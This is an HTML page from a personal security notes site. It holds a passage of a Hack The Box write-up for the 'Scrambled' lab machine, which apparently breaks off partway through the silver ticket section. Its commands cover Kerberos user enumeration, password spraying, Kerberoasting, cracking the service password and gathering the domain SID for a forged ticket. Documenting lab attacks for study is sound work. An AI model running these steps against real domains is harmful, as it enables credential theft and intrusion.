@@ -1,0 +1,585 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Shared" href="../shared/shared.html" /><link rel="prev" title="Sandworm" href="../sandworm/sandworm.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Scrambled - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <p><img alt="scrambled.png" src="../../../../_images/scrambled.png" /></p>
+<section id="scrambled">
+<h1>Scrambled<a class="headerlink" href="#scrambled" title="Permalink to this heading">#</a></h1>
+<section id="enum">
+<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
+<p>Web documentation</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>phone<span class="w"> </span>internal<span class="w"> </span>dial<span class="w"> </span>-<span class="w"> </span><span class="m">08</span>
+support@scramblecorp.com
+ipconfig<span class="w"> </span>&gt;<span class="w"> </span>%USERPROFILE%<span class="se">\D</span>esktop<span class="se">\i</span>p.txt
+<span class="m">4411</span><span class="w"> </span>-<span class="w"> </span>Sale<span class="w"> </span>order<span class="w"> </span>client<span class="w"> </span>custom<span class="w"> </span>app
+NTLM<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>disabled
+</pre></div>
+</div>
+<p>Domain names</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>scramblecorp.com
+scrm.local
+dc1.scrm.local
+hostmaster.scrm.local
+</pre></div>
+</div>
+</section>
+<section id="kerberos-bruteforcing">
+<h2>Kerberos bruteforcing<a class="headerlink" href="#kerberos-bruteforcing" title="Permalink to this heading">#</a></h2>
+<p>Using Kerbrute for user enumeration</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>kerbrute<span class="w"> </span>userenum<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-d<span class="w"> </span>scrm.local<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--dc<span class="w"> </span>scrambled.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+</pre></div>
+</div>
+<p>Using Kerbrute for password spraying</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>kerbrute<span class="w"> </span>passwordspray<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-d<span class="w"> </span>scrm.local<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--dc<span class="w"> </span>scrambled.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>./users.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>ksimpson
+</pre></div>
+</div>
+</section>
+<section id="obtaining-a-tgt">
+<h2>Obtaining a TGT<a class="headerlink" href="#obtaining-a-tgt" title="Permalink to this heading">#</a></h2>
+<p>Granting ourselves a Kerberos TGT based on discovered password</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>scrm.local/ksimpson:ksimpson<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-dc-ip<span class="w"> </span>scrambled.htb
+</pre></div>
+</div>
+<p>Enumerating smb shares with the TGT</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smbclient.py<span class="w"> </span>scrm.local/ksimpson:ksimpson@dc1.scrm.local<span class="w"> </span>-dc-ip<span class="w"> </span>scrambled.htb<span class="w"> </span>-debug<span class="w"> </span>-k<span class="w"> </span>
+</pre></div>
+</div>
+</section>
+<section id="kerberoasting">
+<h2>Kerberoasting<a class="headerlink" href="#kerberoasting" title="Permalink to this heading">#</a></h2>
+<p>Obtaining a TGS with GetUserSPNs.py</p>
+<p>An SPN is the id of a service instance<br />
+SPNs are used by Kerberos to associate a service instance with a service logon account<br />
+This allows a client to request that the service authenticate an account<br />
+even if the client does not have the account name<br />
+So basically which GetUserSPNs does is:<br />
+it gets the SPNs associated with ksimpson<br />
+by requesting TGSes for those, so we get back a TGS<br />
+from which we know the SPN of MSSQLSvc/dcq.scrm.local</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>ksimpson.ccache
+GetUserSPNs.py<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-request<span class="w"> </span>scrm.local/ksimpson<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-no-pass<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-dc-host<span class="w"> </span>dc1.scrm.local<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-outputfile<span class="w"> </span>kerbrute-key.txt
+</pre></div>
+</div>
+<p>Using john to crack the TGS</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>john<span class="w"> </span>kerbrute-key.txt<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+Pegasus60
+</pre></div>
+</div>
+</section>
+<section id="silver-ticket-attack">
+<h2>Silver Ticket Attack<a class="headerlink" href="#silver-ticket-attack" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span> <span class="n">Golden</span> <span class="n">ticket</span> <span class="o">-</span> <span class="n">Access</span> <span class="n">to</span> <span class="n">the</span> <span class="n">whole</span> <span class="n">Domain</span> <span class="n">by</span> <span class="n">stealing</span> <span class="n">the</span> <span class="n">krbtgt</span> <span class="n">NT</span><span class="o">-</span><span class="n">Hash</span> <span class="n">allowing</span> <span class="n">to</span> <span class="n">forge</span> <span class="n">a</span> <span class="n">TGT</span>  
+<span class="o">-</span> <span class="n">Silver</span> <span class="n">ticket</span> <span class="o">-</span> <span class="n">Access</span> <span class="n">to</span> <span class="n">a</span> <span class="n">single</span> <span class="n">service</span> <span class="n">by</span> <span class="n">stealing</span> <span class="n">the</span> <span class="n">svc</span> <span class="n">NT</span><span class="o">-</span><span class="n">Hash</span> <span class="n">allowing</span> <span class="n">to</span> <span class="n">forge</span> <span class="n">a</span> <span class="n">TGS</span>  
+</pre></div>
+</div>
+<p>See BlackHat talk <a class="reference external" href="https://youtu.be/lJQn06QLwEw">Abusing Microsof Kerberos: Sorry You Guys Don’t Get It</a><br />
+We have all the ingredients to perform a silver ticket attack:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">NTHash</span>     <span class="o">-</span> <span class="n">can</span> <span class="n">be</span> <span class="n">derived</span> <span class="kn">from</span> <span class="nn">sqlsvc</span><span class="s1">&#39;s password</span>
+<span class="n">Domain</span> <span class="n">SID</span> <span class="o">-</span> <span class="n">The</span> <span class="n">security</span> <span class="n">identifier</span> <span class="n">of</span> <span class="n">the</span> <span class="n">domain</span>
+<span class="n">Domain</span>     <span class="o">-</span> <span class="n">scrm</span><span class="o">.</span><span class="n">local</span>
+<span class="n">SPN</span>        <span class="o">-</span> <span class="n">we</span> <span class="n">got</span> <span class="n">that</span> <span class="kn">from</span> <span class="nn">GetUserSPN.py</span>
+<span class="n">User</span> <span class="n">Id</span>    <span class="o">-</span> <span class="n">uid</span> <span class="mi">500</span>
+</pre></div>
+</div>
+<p>Get the Domain SID from the PAC - (Privileged Attribute Certificate)</p>
+<p>The PAC is an extension to Kerberos tickets that contains useful information about a user’s privileges<br />
+This information is added to Kerberos tickets by a DC when a user authenticates to the domain.<br />
+The PAC can be read when users use their Kerberos tickets to authenticate to other systems.<br />
+This can be leveraged to determine their level of privileges without reaching out to the DC.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getPac.py<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-targetUser<span class="w"> </span>ksimpson<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>scrm.local/ksimpson:ksimpson
+
+Domain<span class="w"> </span>SID:<span class="w"> </span>S-1-5-21-2743207045-1827831105-2542523200
+</pre></div>
+</div>
+<p>The info that’s relevant to us here is the Domain SID,<br />
+so we could get that from any user in the domain,<br />
+as long as we can authenticate with kerberos and get their PAC</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getPac.py<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-targetUser<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>sqlsvc<span class="w"> </span>scrm.local/sqlsvc:Pegasus60
+
+Domain<span class="w"> </span>SID:<span class="w"> </span>S-1-5-21-2743207045-1827831105-2542523200
+</pre></div>
+</div>
+<p>Make a NT hash from the password we already got from cracking the TGS</p>
+<p><a class="reference external" href="https://codebeautify.org/ntlm-hash-generator">https://codebeautify.org/ntlm-hash-generator</a><br />
+or do it like an adult</p>
